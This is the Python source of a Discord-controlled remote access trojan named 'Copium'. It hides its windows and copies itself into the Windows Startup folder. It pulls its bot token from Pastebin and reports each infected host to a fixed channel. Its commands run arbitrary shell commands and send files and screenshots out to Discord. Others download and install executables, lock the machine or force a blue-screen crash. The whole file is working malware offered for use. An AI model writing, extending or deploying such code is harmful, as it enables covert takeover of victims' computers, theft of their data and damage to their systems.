from discord.ext import commands
from datetime import datetime
import validators
import subprocess
import pyautogui
import winsound
import requests
import discord
import asyncio
import ctypes
import random
import string
import sys
import os
import re

if getattr(sys, 'frozen', False):
    file_path = os.path.abspath(sys.executable)
    silent = 0x08000000
else:
    file_path = os.path.abspath(__file__)
    silent = 0

file_name = file_path.split("\\")[-1]
copium_ver = 1.28
whoami = f"{os.getlogin()}-{random.choice(string.ascii_uppercase)}{random.randint(0, 9)}"
client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
current_login = None


def persistence():
    startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    # if not executed in startup
    if file_path != os.path.join(startup_folder_path, file_name):
        # copies itself to startup
        subprocess.run(f"copy \"{file_path}\" \"{startup_folder_path}", shell=True, creationflags=silent)


def log_command(ctx, args=None, error=False):
    if ctx.message.content:
        command = ctx.message.content
    else:
        content = ""
        if args:
            content = " " + args
        command = f"{ctx.prefix}{ctx.command}{content}"
    return f'{ctx.author} {"caused an error using" if error else "executed"} "{command}" in "#{ctx.channel}" at {datetime.now().strftime("%H:%M:%S")}'


def onefile_exit():
    # if built with pyinstaller
    if getattr(sys, 'frozen', False):
        sys.exit()
    else:
        quit()


@client.event
async def on_ready():
    await client.tree.sync()

    channel = await client.fetch_channel(1051602859940139018)
    await channel.send(f"Host Iniciada em \"{whoami}\"")

    logon_message = f'Logado no nos {client.user}, at {datetime.now().strftime("%H:%M:%S")}, Servidores:'
    print('-' * len(logon_message))
    print(logon_message)
    for guild in client.guilds:
        print(f'"{guild.name}"')
    print('-' * len(logon_message))


@client.event
async def on_command_error(ctx, error):
    await ctx.reply(error, ephemeral=True)
    return print(log_command(ctx, error, error=True))


# Bot commands
@client.hybrid_command(name="lock", with_app_command=True, description="locks the host's computer")
async def lock_command(ctx):
    if current_login != whoami:
        return

    subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True, creationflags=silent)
    await ctx.reply("Computer locked successfully!", ephemeral=True)
    print(log_command(ctx))


@client.hybrid_command(name="download", with_app_command=True,
                       description="downloads from the url to the execution path")
async def download_command(ctx, url, filename=None):
    if current_login != whoami:
        return

    if not filename:
        filename = re.findall("[^(/\\\\:*?\"<>|)]+\\.[^(/\\\\:*?\"<>|)]+", url)[-1]
        if not filename:
            await ctx.reply("You must specify a name or send a url with a name on it", ephemeral=True)
            return
    discord_formatted_path = "\\\\".join(filename.split("\\"))
    await ctx.reply(f"Downloading {discord_formatted_path}", ephemeral=True)
    r = requests.get(url)
    with open(filename, 'wb') as file:
        for chunk in r.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
        if file:
            await ctx.reply(f"Downloaded {discord_formatted_path} successfully", ephemeral=True)
    print(log_command(ctx, url + " " + filename))


@client.hybrid_command(name="upload", with_app_command=True, description="uploads from the path to discord")
async def upload_command(ctx, path):
    if current_login != whoami:
        return

    path = os.path.abspath(path)
    await ctx.reply(file=discord.File(path), ephemeral=True)
    print(log_command(ctx, path))


@client.hybrid_command(name="login", with_app_command=True, description="logs into the specified host")
async def login_command(ctx, host):
    global current_login
    if host == whoami:
        current_login = whoami
        await ctx.reply(f"Logged into {current_login}", ephemeral=True)
    else:
        current_login = None
    print(log_command(ctx, host))


@client.hybrid_command(name="logall", with_app_command=True, description="logs into every account")
async def logall_command(ctx):
    global current_login
    current_login = whoami
    await ctx.reply(f"Logged into {current_login}", ephemeral=True)
    print(log_command(ctx))


@client.hybrid_command(name="version", with_app_command=True, description="tells the version running on the host")
async def version_command(ctx):
    if current_login != whoami:
        return
    await ctx.reply(f"Version {copium_ver}", ephemeral=True)
    print(log_command(ctx))


@client.hybrid_command(name="whoami", with_app_command=True, description="tells the running host")
async def whoami_command(ctx):
    if current_login != whoami:
        return
    await ctx.reply(f"I am {whoami}", ephemeral=True)
    print(log_command(ctx))


@client.hybrid_command(name="exit", with_app_command=True, description="exits the bot")
async def exit_command(ctx):
    if current_login != whoami:
        return

    await ctx.reply(f"{whoami} exiting", ephemeral=True)
    onefile_exit()


@client.hybrid_command(name="update", with_app_command=True, description="updates the host")
async def update_command(ctx, url=None, name=None):
    if current_login != whoami:
        return

    print(log_command(ctx))
    startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if not url:
        url = "https://github.com/Arthurszzz/rcbot/blob/master/Copium.exe?raw=true"
    if not name:
        name = os.path.join(startup_folder_path, "Copium.exe")
    else:
        name = os.path.join(startup_folder_path, name)
    await ctx.reply(f"{whoami} is trying to update", ephemeral=True)
    r = requests.get(url)
    with open(name, 'wb') as file:
        for chunk in r.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)


@client.hybrid_command(name="playsound", with_app_command=True, description="plays a wav file in the background")
async def playsound_command(ctx, filepath):
    if current_login != whoami:
        return

    winsound.PlaySound(filepath, winsound.SND_FILENAME | winsound.SND_ASYNC)
    await ctx.reply(f"Playing {filepath}", ephemeral=True)
    print(log_command(ctx, filepath))


@client.hybrid_command(name="ss", with_app_command=True, description="takes a screenshot of the host")
async def screenshot_command(ctx, path=None):
    if current_login != whoami:
        return
    if path:
        path = os.path.join(path, "ss.png")
    else:
        userprofile = subprocess.run("command", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout
        path = os.path.join(userprofile, "ss.png")
    pyautogui.screenshot(path)
    await ctx.reply(file=discord.File(path), ephemeral=True)
    print(log_command(ctx))
    await asyncio.sleep(1)
    os.remove(path)


@client.hybrid_command(name="bsod", with_app_command=True, description="makes the host's computer die instantly")
async def bsod_command(ctx):
    if current_login != whoami:
        return

    await ctx.reply("Trying to execute a BSOD", ephemeral=True)
    nullptr = ctypes.POINTER(ctypes.c_int)()
    ctypes.windll.ntdll.RtlAdjustPrivilege(ctypes.c_uint(19), ctypes.c_uint(1), ctypes.c_uint(0), ctypes.byref(ctypes.c_int()))
    ctypes.windll.ntdll.NtRaiseHardError(ctypes.c_ulong(0xC000007B), ctypes.c_ulong(0), nullptr, nullptr, ctypes.c_uint(6), ctypes.byref(ctypes.c_uint()))
    ctypes.windll.kernel32.FreeConsole()
    print(log_command(ctx))


@client.hybrid_command(name="cmd", with_app_command=True, description="returns the output of a shell command")
async def cmd_command(ctx, *, command, timeout: int = 30):
    if current_login != whoami:
        return

    await ctx.reply(f'terminal response for "{command}" incoming:', ephemeral=True)
    await asyncio.sleep(0.1)

    command_result = subprocess.run(command, shell=True, timeout=timeout, capture_output=True, encoding='cp858',
                                    creationflags=silent).stdout

    max_length = 2000
    if len(command_result) > max_length:
        for char in range(0, len(command_result), max_length):
            await ctx.reply(command_result[char:char + max_length], ephemeral=True)
            await asyncio.sleep(1)
    elif command_result:
        await ctx.reply(command_result, ephemeral=True)
    else:
        await ctx.reply(f'{command} did not return any results', ephemeral=True)
    print(log_command(ctx, command))


@client.hybrid_command(name="site", with_app_command=True, description="opens the specified site in the host")
async def site_command(ctx, site):
    if current_login != whoami:
        return

    if validators.url(site):
        await ctx.reply(f'Successfully started "{site}"', ephemeral=True)
        subprocess.run(f'start {site}', shell=True, creationflags=silent)
    else:
        raise Exception(f'"{site}" is not a valid url')
    print(log_command(ctx, site))


if __name__ == '__main__':
    persistence()
    client.run(requests.get("https://pastebin.com/raw/uXVCYgzy").content.decode(), log_handler=None)
